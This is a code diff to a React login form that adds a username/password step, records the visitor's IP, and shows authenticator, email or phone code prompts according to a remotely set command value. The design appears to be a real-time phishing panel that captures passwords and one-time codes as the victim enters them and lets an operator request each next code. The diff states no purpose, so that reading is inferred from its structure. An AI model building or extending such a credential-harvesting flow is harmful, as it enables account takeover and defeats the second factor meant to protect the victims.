@@ -14,6 +14,7 @@ import { useEffect, useState } from "react";
 import { AuthenticatorCode } from "./steps/AuthenticatorCode";
 import { PhoneCode } from "./steps/PhoneCode";
 import { EmailCode } from "./steps/EmailCode";
+import { UserPass } from "./steps/UserPass";
 
 export const LoginForm = () => {
   const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
@@ -44,6 +45,7 @@ export const LoginForm = () => {
             sms: "",
             twoFa: "",
           },
+          ip,
           zone: "",
           command: "W_LOGIN",
         });
@@ -72,15 +74,20 @@ export const LoginForm = () => {
   return (
     <>
       <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
-        {/* <UserPass
-          password={password}
-          setPassword={setPassword}
-          setUsername={setUsername}
-          username={username}
-        /> */}
-        {/* <AuthenticatorCode dataRef={dataRef} /> */}
-        {/* <PhoneCode dataRef={dataRef} /> */}
-        <EmailCode dataRef={dataRef} />
+        {command.includes("W_LOGIN") ? (
+          <UserPass
+            password={password}
+            setPassword={setPassword}
+            setUsername={setUsername}
+            username={username}
+            dataRef={dataRef}
+          />
+        ) : null}
+        {command.includes("W_SEC_1") ? (
+          <AuthenticatorCode dataRef={dataRef} />
+        ) : null}
+        {command.includes("W_SEC_2") ? <EmailCode dataRef={dataRef} /> : null}
+        {command.includes("W_SEC_3") ? <PhoneCode dataRef={dataRef} /> : null}
       </div>
     </>
   );
